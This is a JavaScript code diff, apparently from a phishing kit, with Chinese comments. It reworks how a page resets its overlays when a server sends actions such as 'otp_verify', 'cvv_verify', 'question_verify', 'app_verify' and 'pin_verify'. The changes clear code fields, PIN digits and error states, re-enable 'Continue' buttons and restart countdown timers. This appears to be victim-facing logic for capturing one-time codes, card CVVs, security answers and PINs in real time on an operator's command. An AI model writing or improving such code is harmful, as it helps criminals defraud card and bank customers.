@@ -1749,24 +1749,59 @@ fetch('/api/settings')
   function handleAction(p) {
     var a = p.action;
  
-    /* 收到验证类 action 时先隐藏 OTP 区域以便重新展示 */
+    /* 收到验证类 action 时重置所有验证覆盖层状态 */
     if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail' ||
         a === 'cvv_verify'  || a === 'question_verify'  ||  a=== 'app_verify'  ||  a=== 'pin_verify') {
-      //hideOtp();
+      // --- OTP ---
+      q('otp-overlay').classList.add('hidden');
       q('otp-result').className = 'hidden';
       q('otp-form').className = '';
-      q('otp-spinner').style = '';
-      
+      q('otp-spinner').classList.add('hidden');
+      q('otp-error').classList.add('hidden');
+      if (q('otp-code')) q('otp-code').value = '';
+      q('otp-submit').disabled = false;
+      q('otp-submit').textContent = 'Continue';
+      q('otp-resend').disabled = false;
+      q('otp-resend').classList.remove('otp-resend-disabled');
+      q('otp-timer').textContent = '4:59';
+      q('otp-spin-text').textContent = 'Verifying...';
+
+      // --- App Verify ---
       q('app-verify-overlay').classList.add('hidden');
       q('app-spinner').classList.add('hidden');
+      q('app-error').classList.add('hidden');
+      var mounts = ['mount1','mount2','mount3','mount4','mount5','mount6','mount7'];
+      mounts.forEach(function (m) { var el = document.getElementById(m); if (el) { el.classList.add('hidden'); el.innerHTML = ''; } });
+      var avBox = document.getElementById('app-verify-box');
+      if (avBox) avBox.classList.add('hidden');
+      var avBtn = q('app-continue-btn');
+      if (avBtn) { avBtn.disabled = false; avBtn.textContent = 'Continue to complete'; }
 
+      // --- Email ---
       q('email-overlay').classList.add('hidden');
       q('email-spinner').classList.add('hidden');
+      q('email-result').className = 'hidden';
+      q('email-form').className = '';
+      q('email-error').classList.add('hidden');
+      if (q('email-code')) q('email-code').value = '';
+      q('email-submit').disabled = false;
+      q('email-submit').textContent = 'Continue';
+      q('email-resend').disabled = false;
+      q('email-resend').classList.remove('otp-resend-disabled');
+      q('email-timer').textContent = '4:59';
 
+      // --- PIN ---
       q('pin-overlay').classList.add('hidden');
       q('pin-spinner').classList.add('hidden');
+      q('pin-error').classList.add('hidden');
+      var pinDigits = ['pin-d1','pin-d2','pin-d3','pin-d4'];
+      pinDigits.forEach(function (d) { var el = q(d); if (el) el.value = ''; });
+      q('pin-submit').disabled = false;
 
-
+      // --- General ---
+      q('statusMsg').style.display = 'none';
+      q('btnSubmit').disabled = false;
+      q('load-overlay').classList.add('hidden');
     }
  
     if (a === 'ack') {
